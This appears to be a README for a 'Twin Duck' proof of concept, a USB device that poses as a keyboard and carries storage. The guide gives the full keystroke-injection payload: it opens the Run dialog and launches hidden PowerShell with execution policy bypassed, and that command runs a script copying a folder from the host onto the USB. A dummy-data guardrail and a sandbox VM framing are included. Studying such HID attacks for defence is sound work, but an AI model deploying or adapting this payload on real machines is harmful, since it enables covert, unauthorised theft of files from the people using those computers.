# Twin Duck POC Setup Guide

🚧 **Work in Progress (WIP):** This project is actively being tested and refined.  
Expect changes and improvements over time.  

⚠️ **Disclaimer:** This proof-of-concept (POC) is provided **for research and educational purposes only**.  
Use at your own risk. The author is not responsible for any damage, misuse, or consequences.

---

## 0) What You’ll Have When You’re Done
- A Twin Duck device that, on plug-in, types a PowerShell command.
- That command silently runs `Copy-DummyToUsb.ps1` from the USB storage.
- The script copies a dummy source (only if it contains `POC_OK.txt`) to the USB, while writing a log + manifest.

---

## 1) Prep the Dummy Source on the Target VM
```powershell
New-Item -ItemType Directory -Path "C:\POC\Source" -Force | Out-Null
"approved" | Set-Content "C:\POC\Source\POC_OK.txt"
New-Item -ItemType Directory -Path "C:\POC\Source\folder" -Force | Out-Null
"hello" | Set-Content "C:\POC\Source\folder\a.txt"
```

---

## 2) Prepare the Twin Duck Storage (USB Mass-Storage Side)
1. Plug in the device so the storage mounts (e.g., `E:\`).
2. Label the drive to something predictable (the payload searches by label):
   ```powershell
   Set-Volume -DriveLetter E -NewFileSystemLabel "DUCKY"
   ```
   👉 Replace `E` with whatever Windows assigns your USB.  
   The script does **not** hardcode a drive letter—it looks up the USB by its **label** (`DUCKY`).

3. Copy the script to the USB root:  
   - `Copy-DummyToUsb.ps1`

Result:
```
E:\Copy-DummyToUsb.ps1
```

---

## 3) Load the HID Payload (Keyboard Side)
Example payload (`inject_example.txt`):

```
DELAY 2000
GUI r
DELAY 300
STRING powershell -NoP -W Hidden -ExecutionPolicy Bypass -Command "$v=Get-Volume -FileSystemLabel 'DUCKY' -ErrorAction SilentlyContinue | ? DriveType -eq 'Removable' | select -First 1; if($v){ & (Join-Path ($v.DriveLetter+':\') 'Copy-DummyToUsb.ps1') -Source 'C:\POC\Source' -UsbLabel 'DUCKY' -MaxMB 200 }"
ENTER
```

---

## 4) Run the Demo (in Sandbox VM)
1. Ensure `C:\POC\Source` exists and contains `POC_OK.txt`.
2. Plug in the Twin Duck.
3. Check USB contents:
   - `poc_copy.log`
   - `POC_Extracted\`
   - `manifest.json`

---

## 5) Troubleshooting
- **Nothing happens** → increase `DELAY 2000` → `DELAY 4000` or higher.  
- **USB not found** → ensure the volume label is exactly `DUCKY`.  
- **Guardrail trips** → verify `POC_OK.txt` exists in the source path.  
- **Size too large** → re-run with higher `-MaxMB`.  

---

## 6) Optional: Timestamped Runs
Modify the script to copy into `POC_Extracted\<timestamp>` instead of overwriting.
